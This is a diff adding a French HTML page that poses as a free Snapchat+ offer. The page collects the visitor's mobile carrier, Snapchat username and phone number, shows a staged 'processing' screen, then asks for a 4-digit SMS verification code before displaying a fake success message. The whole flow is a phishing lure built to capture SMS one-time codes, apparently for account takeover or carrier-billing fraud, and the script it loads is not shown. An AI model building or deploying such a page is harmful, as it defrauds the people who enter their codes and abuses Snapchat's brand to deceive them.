@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Snapchat+ Gratuit</title>
+  <link rel="icon" type="image/svg+xml" href="assets/snapchat-icon.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <main class="page">
+    <section class="card">
+      <div class="card__brand">
+        <img class="card__logo" src="assets/snapchat-icon.svg" alt="Snapchat">
+      </div>
+
+      <!-- Étape 1 : formulaire -->
+      <div class="step step--active" id="step-form" aria-labelledby="card-title">
+        <header class="card__header">
+          <div class="card__badge">Offre limitée</div>
+          <h1 id="card-title" class="card__title">Obtenez Snapchat+ <span class="card__highlight">Gratuit</span></h1>
+          <p class="card__subtitle">Débloquez les fonctionnalités premium — traînées fantômes, badges, relecture de stories et plus. Aucun paiement requis.</p>
+        </header>
+
+        <p class="section-label">Opérateur mobile</p>
+        <div class="carrier-group" role="group" aria-label="Opérateur mobile">
+          <button type="button" class="carrier-btn carrier-btn--bouygues" data-carrier="bouygues" aria-pressed="false">Bouygues</button>
+          <button type="button" class="carrier-btn carrier-btn--orange" data-carrier="orange" aria-pressed="false">Orange</button>
+          <button type="button" class="carrier-btn carrier-btn--sfr" data-carrier="sfr" aria-pressed="false">SFR</button>
+        </div>
+
+        <div class="fields">
+          <div class="field">
+            <label for="username" class="field__label">Votre nom d'utilisateur Snapchat</label>
+            <div class="field__control">
+              <span class="field__icon" aria-hidden="true">@</span>
+              <input id="username" class="field__input" type="text" autocomplete="username" placeholder="votre_pseudo" spellcheck="false">
+            </div>
+          </div>
+          <div class="field">
+            <label for="phone" class="field__label">Votre numéro de téléphone</label>
+            <div class="field__control">
+              <span class="field__icon field__icon--svg" aria-hidden="true">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+                  <path d="M6.5 3h3l1.2 5.1-1.6 1.1a12 12 0 0 0 5.7 5.7l1.1-1.6L21 15.5v3A1.5 1.5 0 0 1 19.4 20 17 17 0 0 1 4 4.6 1.5 1.5 0 0 1 6.5 3z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
+                </svg>
+              </span>
+              <input id="phone" class="field__input" type="tel" inputmode="tel" autocomplete="tel" placeholder="06 12 34 56 78">
+            </div>
+          </div>
+        </div>
+
+        <button type="button" class="claim-btn" id="claim-btn" disabled>Obtenir Snapchat+</button>
+
+        <p class="status-line" id="status-line">
+          <span class="status-line__dot"></span>
+          <span id="status-text">Sélectionnez votre opérateur mobile pour commencer.</span>
+        </p>
+      </div>
+
+      <!-- Étape 2 : chargement -->
+      <div class="step" id="step-loading" hidden>
+        <div class="loading">
+          <div class="loading__spinner" aria-hidden="true"></div>
+          <h2 class="loading__title">Traitement en cours</h2>
+          <p class="loading__message" id="loading-message">Validation du compte…</p>
+          <ul class="loading__steps" id="loading-steps">
+            <li class="loading__step is-active" data-step="0">Validation du compte</li>
+            <li class="loading__step" data-step="1">Envoi du code de vérification</li>
+            <li class="loading__step" data-step="2">Cela peut prendre plusieurs minutes</li>
+          </ul>
+          <p class="loading__hint">Veuillez ne pas fermer cette page.</p>
+        </div>
+      </div>
+
+      <!-- Étape 3 : code -->
+      <div class="step" id="step-code" hidden>
+        <header class="card__header card__header--compact">
+          <h2 class="card__title card__title--sm">Code envoyé</h2>
+          <p class="card__subtitle">Un code de vérification à 4 chiffres a été envoyé à votre numéro. Entrez-le ci-dessous pour activer Snapchat+.</p>
+        </header>
+
+        <div class="field">
+          <label for="code" class="field__label">Code à 4 chiffres</label>
+          <div class="field__control">
+            <span class="field__icon field__icon--svg" aria-hidden="true">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+                <rect x="4" y="8" width="16" height="12" rx="2" stroke="currentColor" stroke-width="1.8"/>
+                <path d="M8 8V6a4 4 0 0 1 8 0v2" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+              </svg>
+            </span>
+            <input id="code" class="field__input field__input--code" type="text" inputmode="numeric" autocomplete="one-time-code" placeholder="1234" maxlength="4" spellcheck="false">
+          </div>
+        </div>
+
+        <button type="button" class="claim-btn" id="verify-btn" disabled>Vérifier le code</button>
+
+        <p class="status-line is-active">
+          <span class="status-line__dot"></span>
+          <span id="code-status">En attente de votre code SMS à 4 chiffres.</span>
+        </p>
+      </div>
+
+      <!-- Étape 4 : confirmation -->
+      <div class="step" id="step-success" hidden>
+        <div class="success">
+          <header class="card__header card__header--compact">
+            <h2 class="card__title card__title--sm">Merci !</h2>
+            <p class="card__subtitle">Votre abonnement <span class="card__highlight">Snapchat+ gratuit</span> sera actif d'ici quelques heures. Vous recevrez une notification dans l'application dès que tout sera prêt.</p>
+          </header>
+          <ul class="success__details">
+            <li class="success__detail">
+              <span class="success__detail-label">Compte</span>
+              <span class="success__detail-value" id="success-username">—</span>
+            </li>
+            <li class="success__detail">
+              <span class="success__detail-label">Opérateur</span>
+              <span class="success__detail-value" id="success-carrier">—</span>
+            </li>
+          </ul>
+        </div>
+        <p class="status-line is-ready">
+          <span class="status-line__dot"></span>
+          <span>Demande enregistrée avec succès.</span>
+        </p>
+      </div>
+    </section>
+  </main>
+
+  <script src="app.js"></script>
+</body>
+</html>
